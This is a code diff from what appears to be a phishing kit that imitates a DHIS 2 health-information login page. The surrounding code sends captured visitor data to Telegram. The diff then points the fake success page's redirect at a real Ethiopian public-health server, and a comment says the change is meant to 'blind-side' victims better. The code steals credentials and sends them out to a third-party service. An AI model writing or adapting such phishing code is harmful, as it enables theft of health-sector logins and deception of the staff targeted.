@@ -232,15 +232,15 @@ UA: {request.headers.get('User-Agent')}
     send_to_telegram(telegram_msg)
     
     # Return a fake success page that redirects after 2 seconds
-    # Note: Replace 'https://real-dhis2-server.com' with the actual legitimate URL if you want to blind-side them better
+    # Note: Replace 'https://tbh.ephi.gov.et' with the actual legitimate URL if you want to blind-side them better
     return """
     <html>
     <head>
         <title>DHIS 2</title>
         <script>
             setTimeout(function() {
-                window.location.href = 'https://www.dhis2.org'; // Redirect to a neutral page or the
-                window.location.href = 'https://www.dhis2.org'; // Redirect to a neutral page or the actual login
+                window.location.href = 'https://tbh.ephi.gov.et'; // Redirect to a neutral page or the
+                window.location.href = 'https://tbh.ephi.gov.et'; // Redirect to a neutral page or the actual login
             }, 2000);
         </script>
     </head>
